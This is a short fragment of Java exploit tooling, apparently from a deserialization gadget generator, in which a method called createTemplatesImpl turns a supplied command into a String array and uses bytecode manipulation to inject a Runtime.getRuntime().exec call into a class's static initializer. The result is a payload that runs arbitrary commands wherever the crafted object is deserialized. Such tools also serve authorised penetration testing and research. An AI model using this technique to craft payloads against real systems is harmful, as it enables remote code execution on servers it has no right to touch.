...
public class Gadgets {
	...
	public static TemplatesImpl createTemplatesImpl(final String command) throws Exception {
		...
		String arrayCmd ="new String[]{";
		for(String s : command.split(",,")){
			arrayCmd += "\""+s.replaceAll("\"", "\\\\\"") + "\",";
		}
		arrayCmd = arrayCmd.substring(0, arrayCmd.length()-1);
		arrayCmd += "}";
		clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(" +arrayCmd + ");");
